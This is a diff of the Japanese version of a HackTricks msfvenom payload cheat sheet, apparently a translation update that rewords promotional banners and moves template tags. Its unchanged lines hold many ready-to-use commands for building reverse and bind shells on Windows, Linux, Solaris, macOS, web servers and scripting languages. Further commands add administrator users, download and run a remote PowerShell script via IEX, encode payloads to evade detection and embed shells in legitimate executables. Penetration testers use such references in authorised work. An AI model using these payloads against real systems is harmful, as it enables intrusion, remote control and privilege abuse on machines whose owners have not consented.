@@ -2,15 +2,15 @@
 
 <details>
 
-<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>
+<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricks をサポートする他の方法:
 
-* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
-* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。
+* **HackTricks で企業を宣伝したい**または**HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加し、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で**フォロー**してください。**
+* **ハッキングトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
 
@@ -19,15 +19,15 @@ HackTricksをサポートする他の方法:
 経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！
 
 **ハッキングの洞察**\
-ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する
+ハッキングのスリルと挑戦に深く入り込むコンテンツに参加する
 
 **リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、速いペースで変化するハッキングの世界を最新の状態に保つ
+リアルタイムのニュースと洞察を通じて、ハッキングの世界の速いペースについていく
 
-**最新の発表**\
-新しいバグバウンティの開始や重要なプラットフォームの更新情報を入手する
+**最新のアナウンス**\
+最新のバグバウンティの開始や重要なプラットフォームのアップデートについての情報を入手する
 
-**[**Discord**](https://discord.com/invite/N3FrSbmwdy)に参加して、今日からトップハッカーと協力しましょう！**
+**[**Discord**](https://discord.com/invite/N3FrSbmwdy)に参加して、今日からトップハッカーと協力を始めましょう！
 
 ***
 
@@ -35,14 +35,14 @@ HackTricksをサポートする他の方法:
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-アーキテクチャを指定するために `-a` を使用したり、`--platform` を使用することもできます。
+アーキテクチャを指定するために`-a`を使用することもできます、または`--platform`を使用します
 
-## リスト表示
+## リスト化
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## シェルコード作成時の共通パラメータ
+## シェルコードを作成する際の一般的なパラメータ
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -64,13 +64,15 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
 ```
+{% endcode %}
+
 ### ユーザーの作成
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
 ```
-### CMDシェル
+### CMD シェル
 
 {% code overflow="wrap" %}
 ```bash
@@ -83,25 +85,23 @@ msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ex
 msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
 msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
 ```
+{% endcode %}
+
 ### エンコーダ
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### 実行可能ファイル内に埋め込む
+### 実行可能ファイルに埋め込まれた
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
-{% endcode %}
-
-## Linux ペイロード
+## Linux Payloads
 
 ### リバースシェル
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
@@ -118,8 +118,6 @@ msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) 
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
-{% endcode %}
-
 ## **MAC ペイロード**
 
 ### **リバースシェル:**
@@ -134,26 +132,20 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f ma
 ```bash
 msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
 ```
-{% endcode %}
-
 ## **Webベースのペイロード**
 
 ### **PHP**
 
-#### リバースシェル
+#### 逆シェル
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
 ```
-{% endcode %}
-
 ### ASP/x
 
 #### リバースシェル
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
@@ -161,26 +153,22 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ### JSP
 
 #### リバースシェル
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
 ```
-{% endcode %}
-
 ### WAR
 
 #### リバースシェル
-
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
 ```
+{% endcode %}
+
 ### NodeJS
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **スクリプト言語ペイロード**
+## **スクリプト言語のペイロード**
 
 ### **Perl**
 
@@ -188,6 +176,8 @@ msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```bash
 msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
 ```
+{% endcode %}
+
 ### **Python**
 
 {% code overflow="wrap" %}
@@ -200,35 +190,33 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
-```markdown
 {% endcode %}
 
 <figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターと交流しましょう！
+[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！
 
 **ハッキングの洞察**\
-ハッキングのスリルと挑戦に焦点を当てたコンテンツに参加する
+ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう
 
 **リアルタイムハックニュース**\
-リアルタイムのニュースと洞察を通じて、速いペースで変化するハッキングの世界を最新の状態に保つ
+リアルタイムのニュースと洞察を通じて、ハッキングの世界を追いかけましょう
 
-**最新の発表**\
-新しいバグバウンティの開始や重要なプラットフォームの更新情報を入手して最新の情報を得る
+**最新のアナウンスメント**\
+最新のバグバウンティの開始や重要なプラットフォームのアップデートについて情報を得ましょう
 
-[**Discord**](https://discord.com/invite/N3FrSbmwdy) に参加して、今日からトップハッカーと協力し始めましょう！
+**[Discord](https://discord.com/invite/N3FrSbmwdy)** に参加して、今日からトップハッカーと協力しましょう！
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローに学ぶ</strong></a><strong>！</strong></summary>
+<summary><strong>**htARTE (HackTricks AWS Red Team Expert)** で、ゼロからヒーローまでAWSハッキングを学びましょう！</strong></summary>
 
-HackTricksをサポートする他の方法:
+HackTricks をサポートする他の方法:
 
-* **HackTricksにあなたの会社を広告したい**、または **HackTricksをPDFでダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com) を手に入れる
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見する、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**テレグラムグループ**](https://t.me/peass) に **参加する** か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
-* **HackTricks** の [**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) にPRを提出して、あなたのハッキングのコツを共有する。
+* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
+* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) をフォローする
+* **ハッキングトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する
 
 </details>
-```
